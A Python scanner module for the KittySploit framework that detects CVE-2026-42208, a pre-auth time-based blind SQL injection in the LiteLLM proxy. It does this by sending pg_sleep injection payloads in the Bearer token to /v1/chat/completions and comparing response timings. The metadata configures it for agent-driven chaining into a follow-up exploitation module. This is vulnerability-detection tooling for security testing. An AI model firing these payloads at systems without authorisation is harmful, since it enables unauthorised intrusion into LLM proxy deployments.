#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect LiteLLM CVE-2026-42208 pre-auth time-based blind SQL injection."""

import json
import secrets
import statistics
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "LiteLLM CVE-2026-42208 Blind SQLi Detect",
        "description": (
            "Detects CVE-2026-42208 in BerriAI LiteLLM 1.81.16 <= version < 1.83.7: failed-auth "
            "logging passes the raw Authorization bearer into a virtual-key SQL lookup. Probes "
            "POST /v1/chat/completions with x'-prefixed pg_sleep payloads (never sk-) and "
            "requires delay scaling plus a fast sk- control to rule out backoff false positives."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-42208"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-42208",
            "https://github.com/BerriAI/litellm/security/advisories/GHSA-r75f-5x8p-qvmc",
            "https://bishopfox.com/blog/cve-2026-42208-pre-authentication-sql-injection-in-litellm-proxy",
        ],
        "modules": ["auxiliary/admin/http/litellm_cve_2026_42208_sqli"],
        "tags": [
            "web",
            "scanner",
            "litellm",
            "llm",
            "sqli",
            "blind",
            "time-based",
            "pre-auth",
            "postgresql",
            "cve-2026-42208",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 7,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.5,
            "noise": 0.45,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["litellm", "openai"],
                "endpoint_pattern_any": ["/v1/chat/completions"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "sqli", "from_detail": "time-based blind oracle"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/litellm_cve_2026_42208_sqli",
                ],
            },
        },
    }

    port = OptPort(4000, "LiteLLM proxy HTTP port", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    api_path = OptString(
        "/v1/chat/completions",
        "LLM API route for Bearer injection probe",
        False,
        advanced=True,
    )
    sleep_s = OptFloat(4.0, "pg_sleep interval for the timing probe (seconds)", False, advanced=True)
    model = OptString("gpt-3.5-turbo", "Model name in the filler chat body", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self._run_id = secrets.token_hex(3)
        self._nonce_counter = 0

    def _nonce(self) -> str:
        self._nonce_counter += 1
        return f"{self._run_id}{self._nonce_counter:x}"

    def _post_path(self) -> str:
        base = (self.path or "/").rstrip("/")
        suffix = str(self.api_path or "/v1/chat/completions")
        if not suffix.startswith("/"):
            suffix = f"/{suffix}"
        return f"{base}{suffix}" if base else suffix

    def _request_timeout(self) -> int:
        sleep_val = float(self.sleep_s or 4.0)
        return max(int(self.timeout or 20), int(sleep_val * 3 + 20))

    def _send_bearer(self, bearer: str):
        body = json.dumps(
            {
                "model": str(self.model or "gpt-3.5-turbo"),
                "messages": [{"role": "user", "content": "hi"}],
            }
        )
        started = time.perf_counter()
        response = self.http_request(
            method="POST",
            path=self._post_path(),
            headers={
                "Authorization": f"Bearer {bearer}",
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
            data=body,
            timeout=self._request_timeout(),
            allow_redirects=False,
        )
        elapsed = time.perf_counter() - started
        status = int(response.status_code) if response else None
        return status, elapsed

    def run(self):
        sleep_val = float(self.sleep_s or 4.0)
        sleep2 = sleep_val * 2

        baseline_times = []
        status = None
        for _ in range(3):
            status, elapsed = self._send_bearer(f"x' OR '1'='2' -- {self._nonce()}")
            baseline_times.append(elapsed)
        baseline = statistics.median(baseline_times)
        threshold = max(sleep_val * 0.5, baseline * 4)

        st1, t1 = self._send_bearer(
            f"x' OR (SELECT 1 FROM pg_sleep({sleep_val})) IS NOT NULL -- {self._nonce()}"
        )
        st2, t2 = self._send_bearer(
            f"x' OR (SELECT 1 FROM pg_sleep({sleep2})) IS NOT NULL -- {self._nonce()}"
        )
        _stc, tc = self._send_bearer(
            "sk-"
            + f"x' OR (SELECT 1 FROM pg_sleep({sleep_val})) IS NOT NULL -- {self._nonce()}"
        )

        if status is None and st1 is None:
            print_status("CVE-2026-42208 probe failed — target unreachable")
            return False

        delayed = t1 >= threshold
        scales = t2 >= t1 + (sleep_val * 0.5)
        control_fast = tc < threshold
        confirmed = bool(delayed and scales and control_fast)

        if not confirmed:
            if not delayed:
                print_status(
                    f"CVE-2026-42208 not confirmed — baseline {baseline:.3f}s, "
                    f"sleep probe {t1:.3f}s"
                )
            elif not scales:
                print_status("CVE-2026-42208 delay did not scale — likely backoff noise")
            elif not control_fast:
                print_status("CVE-2026-42208 sk- control also slow — inconclusive")
            return False

        reason = (
            f"CVE-2026-42208: pre-auth blind SQLi — baseline {baseline:.3f}s, "
            f"pg_sleep({sleep_val:g}) {t1:.3f}s, pg_sleep({sleep2:g}) {t2:.3f}s"
        )
        print_status("CVE-2026-42208 vuln=True")
        self.set_info(
            severity="critical",
            reason=reason,
            vulnerable=True,
            cve="CVE-2026-42208",
            path=self._post_path(),
            baseline=baseline,
            sleep_probe=t1,
        )
        return True
